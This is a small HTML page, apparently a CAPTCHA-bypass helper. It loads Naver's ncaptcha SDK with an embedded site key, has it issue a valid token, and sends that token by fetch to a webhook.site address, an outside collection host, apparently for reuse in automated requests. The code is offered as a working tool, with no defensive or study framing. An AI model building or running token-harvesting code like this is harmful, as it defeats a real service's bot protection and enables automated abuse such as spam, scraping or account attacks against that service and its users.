<!doctype html>
<html><head><meta charset="utf-8"><title>ncaptcha token issuer</title></head>
<body>
<h2 id="status">loading SDK...</h2>
<pre id="out" style="font-size:18px;word-break:break-all;"></pre>
<script>
var SITEKEY = "aa192dc86f99c6f3788e4adf2f0032d382a9c5350002f8525080a2263591c10011cb841071cdaeb739224be6";
function setStatus(t){ document.getElementById('status').textContent = t; }
function setOut(t){ document.getElementById('out').textContent = t; }
window.__ncaptchaOnloadTok = function() {
  setStatus('SDK loaded, issuing token...');
  try {
    var koop = new window.homz.Koop({siteKey: SITEKEY,
      modeProperties: {fingerprintTimeout: 4000, issueTokenTimeout: 10000, executionTimeout: 15000}});
    koop.f(function(tok) {
      if (tok) {
        setStatus('TOKEN ISSUED, relaying...');
        setOut(tok);
        fetch('https://webhook.site/e281650385d444fd902bffbf064dc138', {method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'text/plain'}, body: tok})
          
          .catch(function(e){ setStatus('RELAY FAILED: ' + e.message); });
      }
      else { setStatus('FAILED: empty token'); }
    });
  } catch(e) { setStatus('FAILED: ' + e.message); }
};
var s = document.createElement('script');
s.src = 'https://ncpt.naver.com/static/ncaptcha-api.js?ncaptcha-sitekey=' + SITEKEY +
        '&ncaptcha-onload=__ncaptchaOnloadTok&ncaptcha-initTimeout=5000';
s.onerror = function(){ setStatus('FAILED: SDK load error'); };
document.head.appendChild(s);
setTimeout(function(){
  if (document.getElementById('status').textContent.indexOf('TOKEN') !== 0 &&
      document.getElementById('status').textContent.indexOf('FAILED') !== 0) {
    setStatus('TIMEOUT waiting for token');
  }
}, 30000);
</script>
</body></html>
